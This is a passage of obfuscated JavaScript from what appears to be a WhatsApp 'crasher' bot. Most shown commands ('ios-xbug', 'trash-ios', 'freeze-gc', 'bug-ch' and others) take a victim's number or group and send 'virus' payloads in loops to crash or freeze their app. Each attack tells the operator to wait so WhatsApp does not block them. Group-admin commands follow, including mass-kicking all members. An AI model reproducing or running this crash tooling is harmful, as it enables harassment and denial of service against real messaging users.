          let はちははも = かそやほむよ[すたきや[0]]?.replace(new RegExp(すたきや[581], すたきや[14]), "");
          countL = parseInt(かそやほむよ[すたきや[1]]);
          if (!はちははも || はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          if (isNaN(countL) || countL < すたきや[1]) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          isTargetX = "" + はちははも;
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[630] + すたきや[631] + すたきや[632] + すたきや[633] + すたきや[634] + すたきや[628]);
          }
          せにににと(すたきや[651] + すたきや[652] + すたきや[653] + すたきや[654] + すたきや[655] + すたきや[656] + isTargetX + ("\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗻𝘃𝗶𝘀\n\n_» After you send the virus, Please wait 5 " + すたきや[668]));
          for (let まさし = すたきや[0]; まさし < countL; まさし++) {
            await あとたや(めねち);
            await ひなゆめぬこ(めねち, ptcp = すたきや[4]);
            await しほひ(くめうめみか, めねち);
            await のなうへた(めねち, ptcp = すたきや[4]);
            await ふうぬあ(めねち);
            await こいふ(くめうめみか, めねち);
            await もきこえいあ(めねち);
            await せへた(くめうめみか, めねち, すたきや[2]);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[639] + すたきや[640] + すたきや[641] + すたきや[642]));
            await とふすせ(すたきや[243]);
          }
        }
        break;
      case すたきや[643] + "vis":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[648] + すたきや[649] + すたきや[650] + たちとた + (すたきや[585] + すたきや[644]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = かそやほむよ[すたきや[0]]?.replace(new RegExp(すたきや[581], すたきや[14]), "");
          countL = parseInt(かそやほむよ[すたきや[1]]);
          if (!はちははも || はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          if (isNaN(countL) || countL < すたきや[1]) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          isTargetX = "" + はちははも;
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[618] + すたきや[619] + すたきや[620] + すたきや[621]);
          }
          せにににと(すたきや[651] + すたきや[652] + すたきや[653] + すたきや[654] + すたきや[655] + すたきや[656] + isTargetX + "\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗��𝗹𝗮𝘆𝗩𝗶𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._");
          for (let まさし = すたきや[0]; まさし < countL; まさし++) {
            await そよい(めねち);
            await ほますのけ(めねち);
            await えちめええ(くめうめみか, めねち);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[657] + すたきや[658] + すたきや[659] + すたきや[660] + すたきや[661]));
            await とふすせ(すたきや[243]);
          }
        }
        break;
      case すたきや[681] + "click":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[648] + すたきや[649] + すたきや[650] + たちとた + (すたきや[585] + すたきや[644]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = かそやほむよ[すたきや[0]]?.replace(new RegExp(すたきや[581], すたきや[14]), "");
          countL = parseInt(かそやほむよ[すたきや[1]]);
          if (!はちははも || はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          if (isNaN(countL) || countL < すたきや[1]) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          isTargetX = "" + はちははも;
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[630] + すたきや[631] + すたきや[632] + すたきや[633] + すたきや[634] + すたきや[628]);
          }
          せにににと(すたきや[662] + すたきや[663] + すたきや[664] + isTargetX + "\n𖥂 𝐕𝐈𝐑𝐔𝐒 : ��𝗹𝗮𝗻𝗸𝗖𝗹𝗶𝗰��\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._");
          for (let まさし = すたきや[0]; まさし < countL; まさし++) {
            await さむねちやね(くめうめみか, めねち);
            await あやつそそ(くめうめみか, めねち);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[639] + すたきや[640] + すたきや[641] + すたきや[642]));
            await とふすせ(すたきや[243]);
          }
        }
        break;
      case "ios-xbug":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[592]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[630] + すたきや[631] + すたきや[632] + すたきや[633] + すたきや[634] + すたきや[628]);
          }
          let めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          let ひふのえは = すたきや[662] + すたきや[663] + すたきや[664] + めねち + (すたきや[675] + "𝗖𝗿𝗮𝘀𝗵𝗜𝗼𝘀\n" + すたきや[676] + すたきや[677] + すたきや[678] + すたきや[679] + すたきや[680]);
          せにににと(ひふのえは);
          for (let まさし = すたきや[0]; まさし < すたきや[18]; まさし++) {
            await へのむつうへ(めねち);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[657] + すたきや[658] + すたきや[659] + すたきや[660] + すたきや[661]));
          }
        }
        break;
      case "trash-" + すたきや[669]:
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[648] + すたきや[649] + すたきや[650] + たちとた + (すたきや[585] + すたきや[644]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = かそやほむよ[すたきや[0]]?.replace(new RegExp(すたきや[581], すたきや[14]), "");
          countL = parseInt(かそやほむよ[すたきや[1]]);
          if (!はちははも || はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          if (isNaN(countL) || countL < すたきや[1]) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          isTargetX = "" + はちははも;
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[665] + すたきや[666] + すたきや[667] + すたきや[628]);
          }
          せにににと(すたきや[635] + すたきや[636] + すたきや[637] + すたきや[638] + すたきや[39] + isTargetX + ("\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗧𝗿𝗮𝘀𝗵𝗟𝗼𝗰𝗜𝗼𝘀\n\n_» After you send the virus, Please wait 5 " + すたきや[668]));
          for (let まさし = すたきや[0]; まさし < countL; まさし++) {
            await ましはめめ(めねち);
            await よおにしめお(めねち);
            await ぬみやはあつ(めねち);
            await ふみそむけみ(めねち, ptcp = すたきや[4]);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[657] + すたきや[658] + すたきや[659] + すたきや[660] + すたきや[661]));
            await とふすせ(すたきや[243]);
          }
        }
        break;
      case すたきや[643] + すたきや[669]:
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[648] + すたきや[649] + すたきや[650] + たちとた + (すたきや[585] + すたきや[644]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = かそやほむよ[すたきや[0]]?.replace(new RegExp(すたきや[581], すたきや[14]), "");
          countL = parseInt(かそやほむよ[すたきや[1]]);
          if (!はちははも || はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          if (isNaN(countL) || countL < すたきや[1]) {
            return にひすもゆ(すたきや[645] + すたきや[646] + すたきや[647] + たちとた + (すたきや[585] + すたきや[644]));
          }
          めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          isTargetX = "" + はちははも;
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[630] + すたきや[631] + すたきや[632] + すたきや[633] + すたきや[634] + すたきや[628]);
          }
          せにににと(すたきや[670] + すたきや[671] + すたきや[672] + すたきや[673] + すたきや[674] + すたきや[629] + isTargetX + (すたきや[675] + "𝗗𝗲𝗹𝗮𝘆𝗜𝗼𝘀\n" + すたきや[676] + すたきや[677] + すたきや[678] + すたきや[679] + すたきや[680]));
          for (let まさし = すたきや[0]; まさし < countL; まさし++) {
            await ふうぬあ(めねち);
            await たにさ(めねち);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[624] + すたきや[625] + すたきや[626] + すたきや[627]));
            await とふすせ(すたきや[243]);
          }
        }
        break;
      case すたきや[690] + すたきや[682]:
      case "fc-gc":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[692] + すたきや[693] + すたきや[694] + すたきや[695] + すたきや[696] + すたきや[697]);
          }
          せにににと(すたきや[662] + すたきや[663] + すたきや[664] + ほけしいたよ + ("\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙��𝗖𝗹𝗶𝗰𝗸\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp" + すたきや[680]));
          await ててうへはめ(うぬせ[すたきや[446]]);
          console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[639] + すたきや[640] + すたきや[641] + すたきや[642]));
          await とふすせ(すたきや[243]);
        }
        break;
      case すたきや[681] + すたきや[682]:
      case "freeze-gc":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!くまにまうつ) {
            return にひすもゆ("This feature is for groups only!");
          }
          せにににと(すたきや[683] + すたきや[684] + すたきや[685] + すたきや[686] + すたきや[687] + すたきや[688] + すたきや[689] + すたきや[39] + ほけしいたよ + "\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗕𝗹𝗮𝗻𝗸&𝗙𝗿𝗲𝗲𝘇𝗲𝗚𝗰\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._");
          await ほてひけひ(うぬせ[すたきや[446]]);
          await ゆにゆね(うぬせ[すたきや[446]]);
          console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[657] + すたきや[658] + すたきや[659] + すたきや[660] + すたきや[661]));
          await とふすせ(すたきや[243]);
        }
        break;
      case "fc-ch":
      case "kill-c" + すたきや[346]:
      case すたきや[690] + すたきや[828]:
      case "bug-ch":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          せにににと("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 ��𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗰𝗖𝗹𝗶��𝗸\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked." + すたきや[622]);
          await ちちせ(うぬせ[すたきや[446]]);
          console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[657] + すたきや[658] + すたきや[659] + すたきや[660] + すたきや[661]));
          await とふすせ(すたきや[243]);
        }
        break;
      case "about":
        {
          せにににと("╔═════ ∘◦ ✧ ◦∘ ═════╗\n👨‍💻 ᴅs ᴘʀɪᴍɪs – ғᴜʟʟsᴛᴀᴄᴋ\n╚═════ ∘◦ ✧ ◦∘ ═════╝\n\n> 🧠 *sᴋɪʟʟᴇᴅ ɪɴ :*\n⚙️ *ᴊᴀᴠᴀsᴄʀɪᴘᴛ | ɴᴏᴅᴇ.ᴊs | ʀᴇᴀᴄᴛ | ᴍᴏɴɢᴏᴅʙ*\n📱 *ʙᴏᴛ ᴅᴇᴠ (ᴡʜᴀᴛsᴀᴘᴘ | ɢɪᴛʜᴜʙ)*\n🌐 *ᴀᴘɪ ɪɴᴛᴇ́ɢʀᴀᴛɪᴏɴ & ᴀᴜᴛᴏᴍᴀᴛɪᴏɴ*\n\n🛠️ *ᴘᴀssɪᴏɴᴀᴛᴇ ᴀʙᴏᴜᴛ ʙᴜɪʟᴅɪɴɢ ᴄʟᴇᴀɴ, ғᴀsᴛ ᴀɴᴅ sᴄᴀʟᴀʙʟᴇ sʏsᴛᴇᴍs*\n🧩 *ᴀʟᴡᴀʏs ᴘᴜsʜɪɴɢ ʟɪᴍɪᴛs – ᴄᴏᴅᴇ ɪs ɴᴏᴛ ᴊᴜsᴛ sʏɴᴛᴀx, ɪᴛ's ᴀʀᴛ.*\n\n📲 *ғᴏʟʟᴏᴡ ᴍʏ ᴄʜᴀɴɴᴇʟ ᴡʜᴀᴛsᴀᴘᴘ* :\n🔗 https://whatsapp.com/channel/0029VbAqjwm1CYoTLEg7KR44\n☎️ ᴄᴏɴᴛᴀᴄᴛ ᴍᴇ\n🔗 https://t.me/dsprimis\n");
        }
        break;
      case すたきや[691]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[729] + すたきや[730] + すたきや[731]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[710] + すたきや[711] + すたきや[712]);
          }
          if (!けもふめ) {
            return にひすもゆ("Only admin/owner can use this featur" + すたきや[44]);
          }
          if (!q && !うぬせ[すたきや[184]]) {
            return にひすもゆ(すたきや[584] + たちとた + (" 509xxx or reply to the target m" + すたきや[46]));
          }
          let ほちいしそね = うぬせ[すたきや[184]] ? (うぬせ[すたきや[184]][すたきや[489]] || うぬせ[すたきや[184]][すたきや[50] + すたきや[51]] || "")[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "") : q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (!ほちいしそね) {
            return にひすもゆ(すたきや[25] + すたきや[699] + すたきや[700]);
          }
          if (ほちいしそね[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          let ややね = "" + ほちいしそね + (すたきや[80] + すたきや[81] + すたきや[82]);
          try {
            await くめうめみか[すたきや[701] + すたきや[702] + すたきや[703] + すたきや[704]](うぬせ[すたきや[446]], [ややね], すたきや[691]);
            にひすもゆ(すたきや[705] + すたきや[706] + "ly add" + "ed *" + ほちいしそね + ("* to g" + すたきや[733]));
          } catch (さゆつす) {
            console[すたきや[440]](さゆつす);
            にひすもゆ(すたきや[742] + "d to ad" + "d user:" + すたきや[39] + (さゆつす[すたきや[104] + すたきや[44]] || さゆつす));
          }
        }
        break;
      case "kick":
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[692] + すたきや[693] + すたきや[694] + すたきや[695] + すたきや[696] + すたきや[697]);
          }
          if (!けもふめ) {
            return にひすもゆ(すたきや[708] + すたきや[698] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[716] + すたきや[717] + すたきや[718] + すたきや[719] + すたきや[720]);
          }
          if (!q && !うぬせ[すたきや[184]]) {
            return にひすもゆ(すたきや[584] + たちとた + (" 91xxxx or reply to the target m" + すたきや[46]));
          }
          let やえきそい = うぬせ[すたきや[184]] ? (うぬせ[すたきや[184]][すたきや[489]] || "")[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "") : q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (!やえきそい) {
            return にひすもゆ(すたきや[25] + すたきや[699] + すたきや[700]);
          }
          let ややね = "" + やえきそい + (すたきや[80] + すたきや[81] + すたきや[82]);
          try {
            await くめうめみか[すたきや[701] + すたきや[702] + すたきや[703] + すたきや[704]](うぬせ[すたきや[446]], [ややね], すたきや[782]);
            にひすもゆ(すたきや[705] + すたきや[706] + "ly iss" + "ued *" + やえきそい + すたきや[707]);
          } catch (さゆつす) {
            にひすもゆ(すたきや[714] + すたきや[715] + "kick u" + "ser");
          }
        }
        break;
      case すたきや[713] + すたきや[44]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[692] + すたきや[693] + すたきや[694] + すたきや[695] + すたきや[696] + すたきや[697]);
          }
          if (!けもふめ) {
            return にひすもゆ(すたきや[708] + すたきや[698] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[710] + すたきや[711] + すたきや[712]);
          }
          if (!q && !うぬせ[すたきや[184]]) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[721] + すたきや[722] + すたきや[723] + すたきや[724] + すたきや[725] + すたきや[726]));
          }
          let やえきそい = うぬせ[すたきや[184]] ? (うぬせ[すたきや[184]][すたきや[489]] || "")[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "") : q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (!やえきそい) {
            return にひすもゆ(すたきや[25] + すたきや[699] + すたきや[700]);
          }
          let ややね = "" + やえきそい + (すたきや[80] + すたきや[81] + すたきや[82]);
          try {
            await くめうめみか[すたきや[701] + すたきや[702] + すたきや[703] + すたきや[704]](うぬせ[すたきや[446]], [ややね], すたきや[713] + すたきや[44]);
            にひすもゆ(すたきや[728] + やえきそい + "* now become admin");
          } catch (くえもいかお) {
            にひすもゆ(すたきや[714] + すたきや[715] + すたきや[713] + すたきや[44]);
          }
        }
        break;
      case すたきや[727]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[692] + すたきや[693] + すたきや[694] + すたきや[695] + すたきや[696] + すたきや[697]);
          }
          if (!けもふめ) {
            return にひすもゆ(すたきや[708] + すたきや[698] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[716] + すたきや[717] + すたきや[718] + すたきや[719] + すたきや[720]);
          }
          if (!q && !うぬせ[すたきや[184]]) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[721] + すたきや[722] + すたきや[723] + すたきや[724] + すたきや[725] + すたきや[726]));
          }
          let やえきそい = うぬせ[すたきや[184]] ? (うぬせ[すたきや[184]][すたきや[489]] || "")[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "") : q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (!やえきそい) {
            return すたきや[25] + すたきや[699] + すたきや[700];
          }
          let ややね = "" + やえきそい + (すたきや[80] + すたきや[81] + すたきや[82]);
          try {
            await くめうめみか.groupParticipantsUpdate(うぬせ[すたきや[446]], [ややね], すたきや[727]);
            すたきや[728] + やえきそい + ("* downgraded" + すたきや[796] + すたきや[487]);
          } catch (くえもいかお) {
            すたきや[714] + すたきや[715] + すたきや[727];
          }
        }
        break;
      case すたきや[732] + すたきや[598]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[729] + すたきや[730] + すたきや[731]);
          }
          if (!けもふめ) {
            return にひすもゆ(すたきや[708] + すたきや[698] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[716] + すたきや[717] + すたきや[718] + すたきや[719] + すたきや[720]);
          }
          if (!うぬせ[すたきや[184]] || !new RegExp(すたきや[442], "")[すたきや[76]](そぬぬぬぬ)) {
            return にひすもゆ("Reply image with:\n" + たちとた + (すたきや[732] + すたきや[733]));
          }
          let くにみめむ = await くめうめみか[すたきや[826] + "adAndS" + "aveMed" + "iaMess" + すたきや[103]](みあちしよ);
          await くめうめみか["updateProfil" + すたきや[808] + "re"](うぬせ[すたきや[446]], {
            [すたきや[122]]: くにみめむ
          })[すたきや[820]](() => {
            return すたきや[772] + "profile " + "photo ch" + "anged su" + "ccessful" + "ly";
          })[すたきや[734]](() => {
            return "❌ Failed to change profile photo" + すたきや[735];
          });
        }
        break;
      case "delppg" + すたきや[598]:
        {
          if (!くまにまうつ) {
            return すたきや[750] + すたきや[751] + すたきや[752];
          }
          if (!けもふめ) {
            return すたきや[737] + すたきや[709];
          }
          if (!まぬともき) {
            return すたきや[738] + すたきや[739] + すたきや[740];
          }
          try {
            await くめうめみか.removeProfilePicture(うぬせ[すたきや[446]]);
            "✅ Group profile photo successfully deleted";
          } catch (くえもいかお) {
            にひすもゆ(すたきや[714] + すたきや[715] + すたきや[736] + " group" + " photo");
          }
        }
        break;
      case すたきや[741] + すたきや[44]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[744] + すたきや[745] + すたきや[746]);
          }
          if (!けもふめ) {
            return にひすもゆ(すたきや[737] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[738] + すたきや[739] + すたきや[740]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[741] + "e newn" + すたきや[55]));
          }
          try {
            await くめうめみか[すたきや[748] + "pdateS" + "ubject"](うぬせ[すたきや[446]], q);
            にひすもゆ("✅ Group name successfully changed to:\n*" + q + すたきや[707]);
          } catch (くえもいかお) {
            にひすもゆ(すたきや[742] + "d to ch" + "ange gr" + "oup nam" + すたきや[44]);
          }
        }
        break;
      case すたきや[747] + すたきや[598]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[744] + すたきや[745] + すたきや[746]);
          }
          if (!けもふめ) {
            return にひすもゆ(すたきや[737] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[738] + すたきや[739] + すたきや[740]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[747] + "c New " + "Descri" + すたきや[451]));
          }
          try {
            await くめうめみか[すたきや[748] + "pdateD" + "escrip" + すたきや[68]](うぬせ[すたきや[446]], q);
            にひすもゆ("✅ Group description successfully changed");
          } catch (くえもいかお) {
            にひすもゆ(すたきや[773] + "to change" + " group de" + "scription");
          }
        }
        break;
      case すたきや[753] + すたきや[749]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[750] + すたきや[751] + すたきや[752]);
          }
          if (!せあいせて && !けもふめ) {
            return にひすもゆ(すたきや[737] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[738] + すたきや[739] + すたきや[740]);
          }
          if (!かそやほむよ[すたきや[0]] || !かそやほむよ[すたきや[1]]) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[753] + "ime 5 " + すたきや[754]));
          }
          let うけしてゆは = parseInt(かそやほむよ[すたきや[0]]);
          let かなおえまや = かそやほむよ[すたきや[1]][すたきや[482] + すたきや[479]]();
          let けきほて = かなおえまや === すたきや[756] ? うけしてゆは * すたきや[243] : かなおえまや === すたきや[754] ? うけしてゆは * すたきや[216] : かなおえまや === すたきや[757] ? うけしてゆは * すたきや[758] : かなおえまや === すたきや[759] ? うけしてゆは * すたきや[760] : すたきや[37];
          if (!けきほて) {
            return にひすもゆ(すたきや[761] + すたきや[762] + すたきや[763] + すたきや[764] + すたきや[765] + すたきや[766] + すたきや[767] + すたきや[615]);
          }
          にひすもゆ(すたきや[768] + すたきや[769] + "closed in " + かそやほむよ[すたきや[0]] + すたきや[39] + かそやほむよ[すたきや[1]]);
          setTimeout(async () => {
            await くめうめみか[すたきや[134] + すたきや[770] + すたきや[771]](うぬせ[すたきや[446]], "announcement");
            にひすもゆ("📌 Group successfully closed (announcement mode)");
          }, けきほて);
        }
        break;
      case すたきや[755] + すたきや[222]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[744] + すたきや[745] + すたきや[746]);
          }
          if (!せあいせて && !けもふめ) {
            return にひすもゆ(すたきや[737] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[738] + すたきや[739] + すたきや[740]);
          }
          if (!かそやほむよ[すたきや[0]] || !かそやほむよ[すたきや[1]]) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[755] + "me 10 " + すたきや[754]));
          }
          let うけしてゆは = parseInt(かそやほむよ[すたきや[0]]);
          let かなおえまや = かそやほむよ[すたきや[1]][すたきや[482] + すたきや[479]]();
          let けきほて = かなおえまや === すたきや[756] ? うけしてゆは * すたきや[243] : かなおえまや === すたきや[754] ? うけしてゆは * すたきや[216] : かなおえまや === すたきや[757] ? うけしてゆは * すたきや[758] : かなおえまや === すたきや[759] ? うけしてゆは * すたきや[760] : すたきや[37];
          if (!けきほて) {
            return にひすもゆ(すたきや[761] + すたきや[762] + すたきや[763] + すたきや[764] + すたきや[765] + すたきや[766] + すたきや[767] + すたきや[615]);
          }
          にひすもゆ(すたきや[768] + すたきや[769] + "opened in " + かそやほむよ[すたきや[0]] + すたきや[39] + かそやほむよ[すたきや[1]]);
          setTimeout(async () => {
            await くめうめみか[すたきや[134] + すたきや[770] + すたきや[771]](うぬせ[すたきや[446]], "not_announcement");
            にひすもゆ(すたきや[772] + "successf" + "ully ope" + "ned (all" + " members" + " can cha" + "t)");
          }, けきほて);
        }
        break;
      case "resetlink":
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[775] + すたきや[776] + すたきや[777]);
          }
          if (!せあいせて && !けもふめ) {
            return にひすもゆ(すたきや[737] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[738] + すたきや[739] + すたきや[740]);
          }
          try {
            let かやう = await くめうめみか.groupRevokeInvite(うぬせ[すたきや[446]]);
            にひすもゆ("✅ Group link successfully reset!\n\n New link:\nhttps://chat.whatsapp.com" + すたきや[189] + かやう);
          } catch (くえもいかお) {
            にひすもゆ(すたきや[773] + "to reset " + "group lin" + すたきや[774]);
          }
        }
        break;
      case "leaveg" + すたきや[598]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[775] + すたきや[776] + すたきや[777]);
          }
          if (!けもふめ) {
            return にひすもゆ("Owner Only!");
          }
          await にひすもゆ("✅ Bot will leave this group...");
          await くめうめみか.groupLeave(うぬせ[すたきや[446]]);
        }
        break;
      case "kickal" + すたきや[101]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[775] + すたきや[776] + すたきや[777]);
          }
          if (!せあいせて && !けもふめ) {
            return にひすもゆ(すたきや[737] + すたきや[709]);
          }
          if (!まぬともき) {
            return にひすもゆ(すたきや[738] + すたきや[739] + すたきや[740]);
          }
          ;
          await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
            [すたきや[43]]: "sᴛᴀʀᴛ." + すたきや[786]
          });
          const くゆひ = await くめうめみか[すたきや[778] + すたきや[779] + すたきや[484]](うぬせ[すたきや[446]]);
          const てしお = [すたきや[604] + すたきや[780] + すたきや[202] + すたきや[203] + すたきや[204], "50940810930@" + すたきや[202] + すたきや[203] + すたきや[204]];
          const いけほは = くゆひ[すたきや[50] + すたきや[781]][すたきや[488]](くめうめみか => {
            return !くめうめみか[すたきや[487]] && !てしお[すたきや[476] + すたきや[477]](くめうめみか[すたきや[47]]);
          })[すたきや[410]](くめうめみか => {
            return くめうめみか[すたきや[47]];
          });
          if (いけほは[すたきや[79]] === すたきや[0]) {
            return にひすもゆ("✅ No non-administrator members to be expelled from this group.");
          }
          await new Promise(くめうめみか => {
            return setTimeout(くめうめみか, すたきや[188]);
          });
          try {
            await くめうめみか[すたきや[701] + すたきや[702] + すたきや[703] + すたきや[704]](うぬせ[すたきや[446]], いけほは, すたきや[782]);
            await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
              [すたきや[43]]: "✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴋɪᴄᴋᴇᴅ ᴀʟʟ ᴍᴇᴍʙᴇʀs"
            });
          } catch (ひそゆつけて) {
            console[すたきや[295]](すたきや[783] + "during" + " purgi" + "ng:", ひそゆつけて);
            await にひすもゆ("❌ An error occurred during the eviction process. Please try again later." + すたきや[11]);
          }
        }
        break;
      case "tagall":
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[775] + すたきや[776] + すたきや[777]);
          }
          let やへま = "*👥 ᴛᴀɢ ᴀʟʟ ʙʏ ᴘʀɪᴍɪs ᴄʀᴀsʜᴇʀ*\n \n                 🗞️ *ᴍᴇssᴀɢᴇ : " + (q ? q : "ʙʟᴀɴᴋ") + "*\n\n";
          for (let ほてつち of よきなな) {
            やへま += "🌹 @" + ほてつち[すたきや[47]][すたきや[469]](すたきや[784])[すたきや[0]] + すたきや[75];
          }
